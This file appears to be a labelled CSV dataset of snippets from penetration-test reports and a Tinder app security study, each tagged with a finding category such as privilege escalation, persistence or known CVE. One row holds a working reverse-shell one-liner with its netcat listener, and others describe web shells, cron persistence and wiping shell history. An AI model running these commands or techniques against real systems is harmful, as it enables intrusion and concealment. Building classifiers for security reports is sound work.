text,label
4.1.2 API resources . . . . . . . . . . . . . . . . . . . . . . . 6,Formatting
4.1.3 Local storage . . . . . . . . . . . . . . . . . . . . . . . 7,Formatting
4.2 Dynamic analysis . . . . . . . . . . . . . . . . . . . . . . . . . 7,Formatting
4.2.1 Secured traffic . . . . . . . . . . . . . . . . . . . . . . 7,Formatting
4.2.2 Insecure traffic . . . . . . . . . . . . . . . . . . . . . . 8,Formatting
4.2.3 Targeting authentication . . . . . . . . . . . . . . . . . 9,Formatting
4.2.4 Replay attacks . . . . . . . . . . . . . . . . . . . . . . 9,Formatting
4.2.5 Data retrieval . . . . . . . . . . . . . . . . . . . . . . . 10,Formatting
4.3 Legal analysis . . . . . . . . . . . . . . . . . . . . . . . . . . . 11,Formatting
4.3.1 Dutch law . . . . . . . . . . . . . . . . . . . . . . . . . 11,Formatting
4.3.2 European law . . . . . . . . . . . . . . . . . . . . . . . 11,Formatting
4.3.3 Privacy concerns . . . . . . . . . . . . . . . . . . . . . 12,Formatting
5 Conclusion 13,Formatting
References 14,Formatting
A Scripts 15,Formatting
A.1 Sending a Tinder message . . . . . . . . . . . . . . . . . . . . 15,Formatting
A.2 Retrieving user history . . . . . . . . . . . . . . . . . . . . . . 15,Formatting
B Traces 15,Formatting
"B.1 Replay, chat message to friend . . . . . . . . . . . . . . . . . 15",Formatting
"B.2 Replay, chat message to stranger . . . . . . . . . . . . . . . . 16",Formatting
C Contributions 18,Formatting
1 Introduction,Formatting
control (e.g. client devices)?,Formatting
2 Related Work,Formatting
do this research.,Formatting
ThisresearchislooselybasedonsimilarresearchintotheGrindrapplication[1].,Formatting
on the Grindr application.,Formatting
### Objective,Formatting
### Requirements,Formatting
## High-Level Summary,Formatting
**Active Directory Set**:,Formatting
**Standalone hosts**:,Formatting
### Recommendations,Formatting
## Methodologies,Formatting
vulnerabilities found.,Formatting
### Information Gathering,Formatting
### Penetration,Formatting
### Maintaining Access,Formatting
### House Cleaning,Formatting
## Active Directory Systems,Formatting
#### Post Exploitation,Formatting
## Standalone Systems,Formatting
"**Vulnerability Fix**: Since this is a custom web application, a specific update will not
properly solve this issue. The application will need to be programmed
to properly sanitize user-input data, ensure that the user is running
off of a limited user account, and that any sensitive data stored
within the SQL database is properly encrypted.",Implementation Flaw - Cryptographic Misuse
"The encryption routine used ECB mode, which does not sufficiently protect against block replay attacks. A mode like CBC or GCM should be used instead.",Implementation Flaw - Cryptographic Misuse
"User passwords were stored using unsalted MD5 hashes, which can be cracked rapidly using rainbow tables. Stronger, salted algorithms like bcrypt are recommended.",Implementation Flaw - Cryptographic Misuse
" Custom error messages
are highly recommended, as it becomes more challenging for the
attacker to exploit a given weakness if errors are not being
presented back to them.",Implementation Flaw - Insecure Error Handling
"The application returned full stack traces when invalid input was submitted, revealing framework and version information to the user.",Implementation Flaw - Insecure Error Handling
"A login page error message disclosed whether the username or password was incorrect, aiding user enumeration.",Implementation Flaw - Insecure Error Handling
"The password is shown to the user before settings are uploaded, allowing reuse in case of failure.",Information Disclosure - UI Exposure
User credentials were visible in the browsers address bar after a failed login attempt.,Information Disclosure - UI Exposure
Temporary password was displayed in plain text during password reset process.,Information Disclosure - UI Exposure
"Sent phishing email with payload, user opened link.",Initial Access - Phishing
"Malicious link in a fake invoice email was clicked by an employee, initiating malware download.",Initial Access - Phishing
User was tricked into opening a document attachment containing a malicious macro.,Initial Access - Phishing
Moved laterally using PsExec after dumping credentials from lsass.exe.,Lateral Movement - Remote Execution
Used WMI to execute commands on another host using stolen credentials.,Lateral Movement - Remote Execution
Remotely scheduled a task using schtasks.exe to gain shell access on a second machine.,Lateral Movement - Remote Execution
"Due to a race condition, a password could be inserted into the wrong browser tab.",Logic Flaw - TOCTOU
"User session was validated before checking file permissions, allowing unauthorized access.",Logic Flaw - TOCTOU
"The application checked for file existence before write, but the file was replaced in the interim.",Logic Flaw - TOCTOU
" We found some interesting articles and papers online, which inspired us to The researchers examined the security of the Grindr dating app and found a serious error in the implementation of Grindr. The Tinder app is not based The first article on Tinder we found was an article on Quartz[2], describ- ing a possible leak of data Tinder used to have. Tinder claimed these data leaks .. happen[s] as youre developing products, and was going to be patched the same day. The issue was fixed only a week later. This leads us to believe the data privacy of Tinder users is not one of their top priorities.",Policy - Regulatory Risk
Tinder must comply with laws governing sensitive data. The Netherlands has a law called 'Wet bescherming persoonsgegevens'.,Policy - Regulatory Risk
"The European law is, however, more strict of securing the information in
transit. This is described in the 95/46/EC[10] regulation. It says that the
developer of the application must take care of security measurements to
ensure the safe transit of data. This data must be protected against:
 Accidental or unlawful destruction
 Loss of data
 Alteration of data
 Unauthorized disclosure or access
 Other forms of unlawful processing
The interesting part of these criteria is that the developer must also
ensure that the data is not accessible. However the API that Tinder uses
(Kontagent) does not make use of any encryption but merely uses a base64
encoding. This is not considered to be good encryption.",Policy - Regulatory Risk
The European law requires data in transit be protected against unauthorized access. Tinder is not in full compliance.,Policy - Regulatory Risk
Set up reverse shell and maintained access using cronjob persistence.,Post - Exploitation - Backdoor Deployment
"**PoC**:
UDP reverse shell command to add to `/tmp/clean.sh`:

```bash
sh -i >& /dev/udp/10.0.0.1/4242 0>&1
```

while listener is running as

```bash
nc -u -lvp 4242
```",Post - Exploitation - Backdoor Deployment
A reverse shell was initiated and cronjobs were inspected. Persistence was established by planting a new cronjob to initiate a reverse shell every minute.,Post - Exploitation - Backdoor Deployment
Uploaded malicious Lambda function via exposed AWS credentials to establish persistence.,Post - Exploitation - Backdoor Deployment
Deployed a custom SSH daemon configured to log credentials and allow attacker access through a hidden port.,Post - Exploitation - Backdoor Deployment
"Planted a Python web shell into an exposed web directory, accessible via an inconspicuous URL, providing command execution through HTTP requests.",Post - Exploitation - Backdoor Deployment
"The house cleaning portions of the assessment ensures that remnants of
the penetration test are removed. Often fragments of tools or user
accounts are left on an organizations computer which can cause security
issues down the road. Ensuring that we are meticulous and no remnants
of our penetration test are left over is important.

After the trophies on both the lab network and exam network were completed,
John removed all user accounts and passwords as well as the Meterpreter
services installed on the system. OffSec should not have to remove any user
accounts or services from the system.",Post - Exploitation - Cleanup and Remediation
Cleanup was performed by removing the cronjob and clearing shell history to avoid detection.,Post - Exploitation - Cleanup and Remediation
"Removed all known artifacts, including payload binaries and temporary logs from `/tmp` and `/var/log`, to minimize the footprint of exploitation.",Post - Exploitation - Cleanup and Remediation
Disabled shell command history and deleted `.bash_history` files on all compromised systems to obscure evidence of executed commands.,Post - Exploitation - Cleanup and Remediation
"John added administrator and root level accounts on all systems compromised. In
addition to the administrative/root access, a Metasploit meterpreter service
was installed on the machine to ensure that additional access could be
established.",Post - Exploitation - Persistence & Privilege Maintenance
"Created a scheduled task set to run a reverse shell binary on user login, granting the attacker persistent access even after reboots.",Post - Exploitation - Persistence & Privilege Maintenance
"Injected malicious code into `.bashrc` for the root user, ensuring that the attacker’s payload would execute each time a privileged shell was opened.",Post - Exploitation - Persistence & Privilege Maintenance
Abused overly permissive IAM roles to escalate privileges in AWS environment.,Privilege Escalation  - Cloud Role Misconfiguration
A misconfigured GCP service account was found to have the Owner role and could be impersonated by any user with compute.instanceAdmin privileges,Privilege Escalation  - Cloud Role Misconfiguration
Azure VM had a managed identity with Contributor access to the subscription. Exploiting it enabled privilege escalation to subscription-wide control,Privilege Escalation  - Cloud Role Misconfiguration
"**Vulnerability Explanation**: The system hosts custom scripts running as root. This poses a
security risk if the scripts are improperly secured, as it may allow
non-privileged users the opportunity to alter these files.",Privilege Escalation  - Insecure Script Permissions
"A specific instance of this security vulnerability was identified
in a script designed to clean the /tmp directory - `/tmp/clean.sh`. This script was
executed with root-level privileges but was incorrectly set as
world-writable. This misconfiguration could be exploited by an
attacker to modify the script's contents and execute arbitrary
commands with root privileges, thereby compromising the integrity
of the system.",Privilege Escalation  - Insecure Script Permissions
"System scan revealed multiple init scripts owned by root but writable by the www-data web server user, allowing escalation via script injection.",Privilege Escalation  - Insecure Script Permissions
"A cron job running every minute as root was discovered to execute a shell script located in a directory with global write permissions, which enabled privilege escalation by overwriting the script.",Privilege Escalation  - Insecure Script Permissions
"Using credentials retrieved from FTP, login was successful on SSH. Privilege escalation checks revealed a SUID binary vulnerable to buffer overflow.",Privilege Escalation  - SUID Exploitation
Local enumeration revealed a SUID binary /usr/bin/vulnprog with improper bounds checking. Exploiting a buffer overflow allowed escalation to root.,Privilege Escalation  - SUID Exploitation
"The binary /usr/local/bin/custom_tool was found with the SUID bit set and executed user-supplied input without sanitization, enabling execution of arbitrary commands as root.",Privilege Escalation  - SUID Exploitation
"A SUID copy of nmap was found on the target system. Using interactive mode, it was possible to spawn a shell with elevated privileges.",Privilege Escalation  - SUID Exploitation
"questions we are going to answer are:  Does Tinder implement HTTPS during communication?  Does Tinder send privacy sensitive data to systems outside of Tinders  Is the undocumented, proprietary Tinder API prone to leaking data?  Is it possible to eavesdrop on conversations between users?",Background Information
"Recently security researcher Shaked Klein Orbach did an audit of the se- Photos and Facebook IDs, due to excess data sent by Tinder. The Tinder people who where not friends, thus bypassing the matching mechanism. Our research will look into the practical security of the Tinder Android ities of man in the middle attacks, eavesdropping on chat messages, identity spoofing or setting up fake matches. When gathering the results of these tests, we can get insight in the security of the Tinder implementation.",Background Information
"It should be noted that the app refused to function when serving HTTPS resources with invalid certificates. This included certificates which were signed but for a invalid domain, unsigned for another domain, or unsigned for the correct domain were all rejected by the application. ",Background Information
"
 The Volley library is a library provided by Google to make it easier for app developers to use HTTP requests effectively. The native Tinder API usage is build upon this library. As such we dont expect many developer bugs or faults which would enable us to retrieve data.",Background Information
10 It should be noted that after the Tinder2.0 update for Android this file was properly obfuscated.,Background Information
WecollecteverythingWegroupitsoitseasytoseeandprioritize  for impact analysis We enable the identification of key trends that are happening with your app in real-time ,Background Information
" This information will most likely be stored indefinitely and used for legitimate purposed as advertised and permitted by the terms, conditions and privacy statements of Tinder. ",Background Information
3 Materials and Methods,Formatting
3.1 Static analysis,Formatting
3.2 Network traffic,Formatting
3.2.1 HTTP(S) Proxies,Formatting
3.2.2 Realization,Formatting
3.3 User authentication,Formatting
4 Analysis,Formatting
4.1 Offline analysis,Formatting
4.1.1 Libraries,Formatting
4.1.2 API resources,Formatting
4.1.3 Local storage,Formatting
4.2 Dynamic analysis,Formatting
4.2.1 Secured traffic,Formatting
" Seeing encrypted traffic to Crittercism, a company which is summarized on their website [6]:",Formatting
TheAPIendpointapi.gotinder.comisonlyavailableofasecureHTTPS,Formatting
connectionandtheapplicationrefusedtoconnectusinganythingbutaprop-erly signed certificate from a trusted CA (see section 3.2.1).,Formatting
4.2.2 Insecure traffic,Formatting
Lack of MFA and centralized logging in AWS configuration.,Support - Recommendation
Hash0 could benefit from unit tests of critical functions.,Support - Recommendation
"With this we can conclude an answer to Does Tinder correctly implement HTTPS during communication?, namely that the Tinder API uses HTTPS to secure traffic to their service. Although we were able to circumvent this (see section 3.2.1) we had to install a custom root certificate authority on our client devices, which required full administrative control of the devices. Should this be a concern for Tinder they could consider certificate pinning[7].",Support - Recommendation
We recommend Tinder investigate whether communication with Kontagent can be secured.,Support - Recommendation
"John recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date. John utilized a widely adopted approach to performing penetration testing that is effective in testing how well the OffSec Labs and Exam environments are secure. Below is a breakout of how John was able to",Support - Recommendation
**Vulnerability Fix**: The SMB should be configured with credentials and guest enumeration should be disabled.,Support - Recommendation
**Vulnerability Fix**: Change permissions on the custom script `/tmp/clean.sh` to be writable only by root.,Support - Recommendation
"**Vulnerability Fix**: The publishers of the Ability Server have issued a patch to fix
this known issue. It can be found here: http://www.code-crafters.com/abilityserver/",Support - Recommendation
1http://forum.xda-developers.com/showthread.php?t=1910873,Support - Tool Reference
2http://www.aircrack-ng.org/doku.php?id=airbase-ng,Support - Tool Reference
3http://mitmproxy.org,Support - Tool Reference
4http://www.roe.ch/SSLsplit,Support - Tool Reference
5http://www.utest.com/apphance,Support - Tool Reference
6https://www.crittercism.com/,Support - Tool Reference
7https://developers.facebook.com/docs/android/,Support - Tool Reference
8http://www.kontagent.com/,Support - Tool Reference
9https://android.googlesource.com/platform/frameworks/volley,Support - Tool Reference
"* Connected to api.gotinder.com (107.21.49.214) port 443 (#0)
* SSL connection using DHE-RSA-AES256-SHA
* SSL certificate verify ok.
> POST /user/matches/111111111111111111111111 HTTP/1.1
> User-Agent: Tinder Android Version 2.0.1
> Host: api.gotinder.com
> X-Auth-Token: 11111111-2222-3333-4444-555555555555
> Content-Length: 55
> Content-Type: application/x-www-form-urlencoded

* upload completely sent off: 55 out of 55 bytes
< HTTP/1.1 401 Unauthorized
{
  ""status"": ""401"",
  ""error"": ""X-Auth-Token, match id, and message are required to send a message""
}",Support - Tool Reference
"Apache server identified as version 2.4.49, vulnerable to CVE-2021-41773.",Vulnerability - Known CVE
"OpenSSL version 1.0.2k detected, which is affected by CVE-2016-2107, allowing padding oracle attacks on AES CBC cipher.",Vulnerability - Known CVE
"The server was running Log4j 2.14.1, which is vulnerable to CVE-2021-44228 (Log4Shell), allowing remote code execution via crafted log messages.",Vulnerability - Known CVE
"PHP version 7.3.6 detected on the host, which is impacted by CVE-2019-11043 — a flaw in the FPM module that allows remote code execution.",Vulnerability - Known CVE
"The Windows SMBv1 service is enabled and vulnerable to CVE-2017-0144 (EternalBlue), which may permit remote exploitation by unauthenticated users.",Vulnerability - Known CVE
"An outdated jQuery library (1.7.2) was discovered on the web application, known to be affected by CVE-2015-9251, enabling XSS via cross-domain requests.",Vulnerability - Known CVE
"Detected Exim mail server version 4.87, which is susceptible to CVE-2019-15846, allowing remote command execution without authentication.",Vulnerability - Known CVE
Exposed Jenkins dashboard allowed anonymous command execution on build nodes.,Exploitation - CI/CD Remote Code Execution
Sensitive log files containing user credentials were publicly accessible in an open Azure Blob storage container.,Exfiltration - Cloud Storage Misconfiguration
An improperly secured GCP bucket exposed confidential financial records to the public.,Exfiltration - Cloud Storage Misconfiguration
An attacker exploited a misconfigured GitLab runner to gain shell access on the build environment.,Exploitation - CI/CD Remote Code Execution
Unauthorized access to Bamboo server allowed the attacker to execute arbitrary scripts during the build pipeline.,Exploitation - CI/CD Remote Code Execution
Cached files on device included screenshots of user activity logs and partial authentication tokens in plain text.,Exploitation - Insecure Local Storage
"User credentials and session tokens were stored unencrypted in browser localStorage, accessible via any loaded script.",Exploitation - Insecure Local Storage
Used responder to poison LLMNR requests and capture NTLMv2 hashes on the internal network.,Exploitation - LLMNR Spoofing
"Tricked a victim into connecting to a rogue SMB share via LLMNR/NBT-NS spoofing, captured credentials, and relayed them for access.",Exploitation - LLMNR Spoofing
Attacker exploited an outdated Apache Struts installation to gain shell access via a crafted HTTP request.,Exploitation - Remote Code Execution
"RCE achieved by uploading a malicious PHP file through an unrestricted file upload form, then accessing it via the web.",Exploitation - Remote Code Execution
Exploited deserialization flaw in the application -s API endpoint to execute arbitrary commands on the backend server.,Exploitation - Remote Code Execution
"Compromised Jenkins pipeline through script console, allowing arbitrary code to run on build agents.",Exploitation - Remote Code Execution
Used insecure YAML parser to execute OS commands via a manipulated configuration file.,Exploitation - Remote Code Execution
"One of the first attacks tried on the Tinder API was to check if we could exchange a third party Facebook token for a Tinder session token. We send a fully authorized token, created from the Facebook Graph API Explorer11.",Exploitation - Token Misuse Risk
"Pages could lie about their URL, tricking the app into giving a password to the wrong domain.",Exploitation - Trust Boundary Manipulation
"What users might not realize is the insecure channel used for this, enabling a motivated third party to passively inspect and log it.",Exploitation - Weak Transport Security
Attackers reused session tokens from stolen browser sessions to bypass login.,Exploitation - Token Misuse Risk
User was tricked into clicking a link that appeared to belong to their company domain but led to a malicious site that stole credentials.,Exploitation - Trust Boundary Manipulation
Sensitive data transmitted over HTTP allowed an attacker on the same network to capture login details.,Exploitation - Weak Transport Security
"Third-party API integration failed to validate JWT issuer, allowing forged tokens to access user accounts.",Exploitation - Token Misuse Risk
Browser autofill filled credentials into a phishing site with a spoofed subdomain.,Exploitation - Trust Boundary Manipulation
"Mobile app failed to enforce HTTPS, exposing login credentials over open Wi-Fi.",Exploitation - Weak Transport Security
